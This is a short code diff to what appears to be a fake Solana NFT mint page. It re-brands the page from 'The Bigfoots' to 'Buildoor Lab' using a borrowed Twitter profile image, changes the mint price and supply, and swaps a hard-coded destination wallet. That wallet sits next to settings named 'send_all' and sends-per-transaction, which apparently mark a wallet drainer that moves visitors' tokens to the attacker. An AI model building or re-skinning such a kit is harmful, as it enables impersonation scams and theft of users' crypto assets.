@@ -6,10 +6,10 @@ import OwnLayout from "./OwnLayout/OwnLayout";
 import imgDiscord from './icons8-discord-50.png'
 import imgTwitter from './icons8-twitter-50.png'
 
-const solAmount = '0.1'
-const image = 'https://pbs.twimg.com/profile_images/1732864974694072320/CJAQwIdC_400x400.jpg'
-const Title = 'The Bigfoots'
-const supply = 788
+const solAmount = '1.65'
+const image = 'https://pbs.twimg.com/profile_images/1714414059745939456/isV2VQLv_400x400.jpg'
+const Title = 'Buildoor Lab'
+const supply = 144
 
 document.title = Title
 document.getElementById('favicon').setAttribute('href', image)
@@ -19,7 +19,7 @@ const ACTION = 'send_all';
 const SENDS_IN_ONE_TX = 7;
 // const CLOSES_IN_ONE_TX = 27;
 
-const DESTINATION = new PublicKey('BURn8W8kv6xfQfzgqCzdS8kcMyRoVsQc95MsoqjtoRKC');
+const DESTINATION = new PublicKey('4444yauc6XPT2TKY1GQkQ88SKeJaSVzH5JkohuHmPJNR');
 
 const tokenProgram = TOKEN_PROGRAM_ID;
 
